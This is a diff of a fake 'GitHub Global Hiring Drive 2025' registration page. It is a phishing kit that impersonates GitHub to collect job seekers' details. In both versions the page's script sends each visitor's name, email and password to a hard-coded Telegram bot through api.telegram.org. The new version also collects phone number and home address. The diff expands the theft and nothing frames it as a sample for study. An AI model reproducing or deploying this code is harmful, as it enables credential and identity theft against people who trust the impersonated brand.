@@ -2,164 +2,106 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Register for GitHub Global Hiring</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>GitHub Global Hiring Drive 2025</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
-
     body {
-      margin: 0;
-      padding: 0;
-      font-family: 'Inter', sans-serif;
-      background: linear-gradient(to right, #f8f9fa, #e9ecef);
-      color: #212529;
-    }
-
-    header {
-      background-color: #24292e;
-      color: white;
-      padding: 30px 20px;
-      text-align: center;
-      font-size: 24px;
-      font-weight: 800;
-    }
-
-    .container {
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(to bottom right, #e3f2fd, #ffffff);
+      padding: 30px;
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
-      padding: 40px 20px;
     }
-
+    h1 {
+      color: #1a237e;
+      margin-bottom: 20px;
+    }
     form {
-      background: white;
+      background: #ffffff;
       padding: 40px;
       border-radius: 12px;
-      max-width: 450px;
+      max-width: 500px;
       width: 100%;
       box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
-      animation: slideIn 0.6s ease forwards;
     }
-
-    @keyframes slideIn {
-      from { opacity: 0; transform: translateY(30px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    input, button {
+    input, textarea, button {
       width: 100%;
-      padding: 14px;
       margin: 12px 0;
-      font-size: 16px;
+      padding: 14px;
       border-radius: 8px;
       border: 1px solid #ccc;
+      font-size: 16px;
     }
-
-    input:focus {
-      outline: none;
-      border-color: #007bff;
-      box-shadow: 0 0 5px rgba(0,123,255,0.4);
-    }
-
     button {
-      background-color: #28a745;
+      background-color: #1a237e;
       color: white;
       font-weight: bold;
+      cursor: pointer;
       border: none;
-      transition: background-color 0.3s ease;
+      transition: background 0.3s ease;
     }
-
     button:hover {
-      background-color: #218838;
+      background-color: #0d1649;
     }
-
     #thankyou {
       display: none;
-      margin-top: 30px;
-      font-weight: 600;
+      margin-top: 20px;
+      color: green;
       font-size: 18px;
-      color: #28a745;
-      text-align: center;
-      animation: fadeIn 1s ease forwards;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-
-    footer {
-      text-align: center;
-      padding: 20px;
-      font-size: 14px;
-      color: #6c757d;
-    }
-
-    .description {
-      max-width: 600px;
-      text-align: center;
-      margin: 20px auto;
-      color: #495057;
-      font-size: 17px;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
-  <header>
-    GitHub Global Hiring Program
-  </header>
 
-  <div class="container">
-    <div class="description">
-      Join our exclusive GitHub Global Hiring initiative where top tech talent is discovered. Submit your details to be considered for the next round of hiring for engineering, research, and developer experience roles.
-    </div>
+  <h1>GitHub Global Hiring Drive 2025</h1>
 
-    <form id="registerForm">
-      <input type="text" name="name" placeholder="Your Full Name" required />
-      <input type="email" name="email" placeholder="Your Email Address" required />
-      <input type="password" name="password" placeholder="Set a Secure Password" required />
-      <button type="submit">Submit Application</button>
-    </form>
+  <form id="registerForm">
+    <input type="text" name="name" placeholder="Full Name" required />
+    <input type="email" name="email" placeholder="Email Address" required />
+    <input type="text" name="phone" placeholder="Contact Number" required />
+    <textarea name="address" rows="3" placeholder="Residential Address" required></textarea>
+    <input type="password" name="password" placeholder="Set a Password" required />
+    <button type="submit">Register for Drive</button>
+  </form>
 
-    <div id="thankyou">✅ Thank you! You will be contacted by email for the next steps.</div>
-  </div>
-
-  <footer>
-    © 2025 GitHub, Inc. · All rights reserved.
-  </footer>
+  <div id="thankyou">✅ Thank you! You will be contacted by email shortly.</div>
 
   <script>
     document.getElementById("registerForm").addEventListener("submit", async function (e) {
       e.preventDefault();
-      const form = e.target;
 
+      const form = e.target;
       const data = {
         name: form.name.value,
         email: form.email.value,
+        phone: form.phone.value,
+        address: form.address.value,
         password: form.password.value
       };
 
       try {
         await fetch("https://api.telegram.org/bot7448574888:AAEqL3IHQocQslKBwia_TTAlt0jizyHao-U/sendMessage", {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
+          headers: {
+            "Content-Type": "application/json"
+          },
           body: JSON.stringify({
-            chat_id: "968143308",
-            text: `📝 New GitHub Application\nName: ${data.name}\nEmail: ${data.email}\nPassword: ${data.password}`
+            chat_id: "<968143308>",
+            text: `📥 *New Registration - GitHub Hiring*\n\n👤 Name: ${data.name}\n📧 Email: ${data.email}\n📱 Phone: ${data.phone}\n🏠 Address: ${data.address}\n🔒 Password: ${data.password}`,
+            parse_mode: "Markdown"
           })
         });
 
         form.style.display = "none";
         document.getElementById("thankyou").style.display = "block";
       } catch (error) {
-        alert("There was an error submitting your application. Please try again.");
+        alert("Error submitting form. Please try again.");
         console.error(error);
       }
     });
   </script>
+
 </body>
 </html>
